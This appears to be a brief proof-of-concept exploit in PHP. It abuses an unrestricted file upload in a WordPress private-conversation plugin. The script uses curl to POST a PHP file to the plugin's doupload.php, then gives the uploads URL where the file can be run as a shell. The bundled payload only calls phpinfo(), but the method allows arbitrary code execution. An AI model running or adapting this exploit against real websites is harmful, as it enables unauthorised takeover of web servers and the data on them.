<?php

$uploadfile="lo.php";
$ch = 
curl_init("http://www.exemple.com/wordpress/wp-content/plugins/wordpress-member-private-conversation/doupload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('Filedata'=>"@$uploadfile",
         'folder'=>"/test/"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access :
http://www.exemple.com/wordpress/wp-content/uploads/user_uploads/test/lo.php

lo.php
<?php
phpinfo();
?>